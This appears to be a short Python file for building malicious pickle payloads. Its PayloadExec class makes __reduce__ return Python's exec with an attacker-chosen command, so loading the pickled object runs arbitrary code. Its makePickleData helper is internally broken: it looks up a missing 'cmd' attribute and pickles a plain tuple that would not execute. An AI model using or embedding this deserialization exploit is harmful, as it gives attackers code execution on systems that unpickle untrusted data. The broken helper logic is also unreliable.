import pickle
import io

class Payload:
    def __reduce__(self):
        raise NotImplementedError(
            "Cannot call __reduce__ directly on instances with no restore operation defined"
        )


class PayloadExec(Payload):
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (exec, (self.cmd,))


def makePickleData(payload):
    """
    Get serialized data from the payload object and serialize it before returning it.
    Serialize payloads that would otherwise trigger a warning when unpickled.
    """
    payload_types = {
        Payload: PayloadExec
    }

    if type(payload) not in payload_types:
        return pickle.dumps(payload)

    try:
        payload_obj = payload_types[type(payload)](payload.__dict__['cmd'])
        data = payload_obj.__reduce__()
        return pickle.dumps(data)
    except Exception as e:
        raise TypeError(f"Failed to serialize payload: {e}") from e
